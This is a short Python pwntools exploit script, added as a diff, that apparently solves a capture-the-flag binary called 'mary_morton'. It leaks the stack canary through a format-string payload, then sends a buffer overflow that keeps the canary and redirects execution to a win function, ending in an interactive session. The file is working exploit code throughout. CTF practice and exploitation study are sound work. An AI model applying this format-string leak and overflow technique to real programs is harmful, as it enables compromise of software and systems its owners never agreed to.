@@ -1,0 +1,29 @@
+from pwn import *
+
+p = process("./mary_morton")
+
+'''
+p = gdb.debug("./mary_morton", gdbscript = 
+set follow-fork-mode parent
+set follow-exec-mode same
+b *0x400944
+b *0x4009A5
+)
+'''
+
+
+e = ELF("./mary_morton")
+win = 0x00000000004008DE
+
+p.sendline(b"2")
+payload = b"%23$p"
+p.sendafter(b"battle \n", payload)
+canary = int(p.recv(0x12), 16)
+
+p.sendline(b"1")
+payload = b"A" * 0x88 + p64(canary) + b"B"* 8 + p64(win)
+p.sendafter(b"battle \n", payload)
+
+print(hex(canary), len(payload))
+
+p.interactive()
